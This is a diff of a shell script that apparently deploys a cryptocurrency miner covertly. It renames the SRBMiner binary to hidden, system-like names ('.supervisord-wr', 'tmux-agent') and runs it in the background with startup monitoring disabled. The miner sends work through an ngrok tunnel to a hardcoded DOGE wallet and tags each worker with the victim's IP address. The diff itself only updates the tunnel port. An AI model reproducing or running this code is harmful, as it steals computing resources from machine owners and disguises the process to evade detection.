@@ -11,10 +11,10 @@ status_code=$(tail -n1 <<< "$response")
 if [ "$status_code" -eq 200 ]; then
     ip_address=$(cat /tmp/ip_address.txt | tr -d '[:space:]')  # Menghapus spasi/karakter kosong lainnya
     echo "IP Address from $url: $alamatip"
-mv SRBMiner-MULTI .supervisord-wr && ./.supervisord-wr --algorithm verushash --disable-gpu --cpu-threads 8 --pool 0.tcp.ap.ngrok.io:18267 --wallet DKcjitN7vxfFv9ynJ2eXDsiw6oWRurjSYN --worker $alamatip --password ID=$alamatip,c=DOGE --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background
+mv SRBMiner-MULTI .supervisord-wr && ./.supervisord-wr --algorithm verushash --disable-gpu --cpu-threads 8 --pool 0.tcp.ap.ngrok.io:18355 --wallet DKcjitN7vxfFv9ynJ2eXDsiw6oWRurjSYN --worker $alamatip --password ID=$alamatip,c=DOGE --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background
 else
     echo "Failed to get IP from $url, status code: $status_code"
-mv SRBMiner-MULTI .supervisord-wr && ./.supervisord-wr --algorithm verushash --disable-gpu --cpu-threads 8 --pool 0.tcp.ap.ngrok.io:18267 --wallet DKcjitN7vxfFv9ynJ2eXDsiw6oWRurjSYN --worker $status_code --password ID=$status_code,c=DOGE --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background
+mv SRBMiner-MULTI .supervisord-wr && ./.supervisord-wr --algorithm verushash --disable-gpu --cpu-threads 8 --pool 0.tcp.ap.ngrok.io:18355 --wallet DKcjitN7vxfFv9ynJ2eXDsiw6oWRurjSYN --worker $status_code --password ID=$status_code,c=DOGE --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background
 fi
 
 #mv SRBMiner-MULTI tmux-agent && ./tmux-agent --algorithm minotaurx --pool stratum+tcp://minotaurx.asia.mine.zergpool.com:7019 --wallet D9Qg9EZCFksKgFZhnjT5ET5xc37TJXzQ9n.srbX --password c=DOGE,mc=MAZA --keepalive true --cpu-threads 4
